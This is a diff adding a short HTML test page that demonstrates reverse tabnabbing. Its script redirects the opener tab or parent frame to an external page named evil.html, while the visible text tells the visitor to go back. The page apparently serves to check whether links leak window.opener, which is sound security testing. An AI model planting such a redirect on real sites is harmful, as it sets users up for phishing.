@@ -1,0 +1,12 @@
+<html>
+    <head>
+        <title>Tab Nabbing Test Page</title>
+    </head>
+    <body>
+        <script>
+            if (window.opener) window.opener.parent.location.replace('http://ry0tak.github.io/tabnabbing/evil.html');
+            if (window.parent != window) window.parent.location.replace('http://ry0tak.github.io/tabnabbing/evil.html');
+        </script>
+        <h1>Nothing here! Back to your page!</h1>
+    </body>
+</html>
